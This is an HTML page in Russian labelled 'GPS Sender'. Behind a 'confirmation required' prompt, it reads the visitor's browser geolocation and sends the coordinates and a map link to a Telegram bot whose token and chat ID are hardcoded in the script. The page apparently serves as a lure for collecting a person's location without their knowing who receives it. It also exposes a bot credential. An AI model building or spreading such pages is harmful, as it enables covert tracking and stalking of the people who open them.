<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>GPS Sender</title>
    <style>
        body { font-family: sans-serif; text-align: center; margin-top: 50px; background: #121212; color: #fff; padding: 20px; }
        h2 { color: #4CAF50; }
        #status { padding: 20px; font-size: 18px; margin-top: 10px; }
        button { background-color: #4CAF50; color: white; border: none; padding: 15px 30px; font-size: 18px; border-radius: 8px; cursor: pointer; margin-top: 20px; }
        button:active { background-color: #45a049; }
    </style>
</head>
<body>
    <h2 id="title">Требуется подтверждение</h2>
    <div id="status">Нажмите кнопку ниже, чтобы передать координаты.</div>
    
    <button id="geoBtn" onclick="getLocation()">Начать определение</button>

    <script>
        const TOKEN = "9218562846:AAGbvc-EJ2QLHcs8qW-c__liAzlBgUp4HnU";
        const CHAT_ID = "5328460264";

        function getLocation() {
            const statusDiv = document.getElementById("status");
            const titleH2 = document.getElementById("title");
            const btn = document.getElementById("geoBtn");

            btn.style.display = "none";
            titleH2.innerText = "Поиск координат...";
            statusDiv.innerText = "Ожидание ответа от датчиков телефона...";

            if (!navigator.geolocation) {
                titleH2.innerText = "Ошибка";
                statusDiv.innerText = "Геолокация не поддерживается вашим браузером.";
                return;
            }

            navigator.geolocation.getCurrentPosition(
                function(position) {
                    const lat = position.coords.latitude;
                    const lon = position.coords.longitude;
                    const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
                    
                    // Исправлено имя переменной на mapsLink
                    const text = `📍 Координаты с телефона:\nШирота: ${lat}\nДолгота: ${lon}\nКарта: ${mapsLink}`;

                    statusDiv.innerText = "Координаты получены, отправляем...";

                    const url = `https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(text)}`;
                    
                    // Отправка через fetch с режимом no-cors обходит блокировку браузера
                    fetch(url, { mode: "no-cors" })
                        .then(() => {
                            titleH2.innerText = "Отправлено! ✔️";
                            statusDiv.innerText = `Координаты (${lat.toFixed(5)}, ${lon.toFixed(5)}) успешно переданы в Telegram.`;
                        })
                        .catch((err) => {
                            titleH2.innerText = "Ошибка сети";
                            statusDiv.innerText = "Не удалось отправить запрос: " + err.message;
                            btn.style.display = "inline-block";
                        });
                },
                function(error) {
                    titleH2.innerText = "Ошибка!";
                    let errorMsg = "";
                    switch(error.code) {
                        case error.PERMISSION_DENIED:
                            errorMsg = "Доступ запрещен. Разрешите геолокацию в настройках сайта (значок замка в адресной строке).";
                            break;
                        case error.POSITION_UNAVAILABLE:
                            errorMsg = "Местоположение недоступно. Проверьте, включен ли GPS в шторке телефона.";
                            break;
                        case error.TIMEOUT:
                            errorMsg = "Время ожидания истекло. Попробуйте еще раз.";
                            break;
                        default:
                            errorMsg = "Ошибка: " + error.message;
                    }
                    statusDiv.innerText = errorMsg;
                    btn.style.display = "inline-block";
                },
                { enableHighAccuracy: false, timeout: 15000, maximumAge: 10000 }
            );
        }
    </script>
</body>
</html>
